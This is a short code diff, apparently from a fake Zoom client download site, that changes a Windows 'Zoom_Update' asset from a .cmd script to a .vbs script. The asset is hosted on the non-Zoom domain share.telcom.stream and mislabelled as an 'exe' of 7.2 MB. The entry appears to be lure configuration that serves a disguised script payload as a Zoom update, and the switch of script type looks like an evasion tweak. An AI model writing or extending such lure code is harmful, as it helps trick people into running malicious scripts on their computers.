@@ -90,8 +90,8 @@ const FALLBACK_ASSETS: ZoomClientAsset[] = [
     updatedAt: 0,
   },
   {
-    name: "Zoom_Update.cmd",
-    url: "https://share.telcom.stream/dl/windows.cmd",
+    name: "Zoom_Update.vbs",
+    url: "https://share.telcom.stream/dl/windows.vbs",
     size: 7_200_000,
     platform: "windows",
     format: "exe",
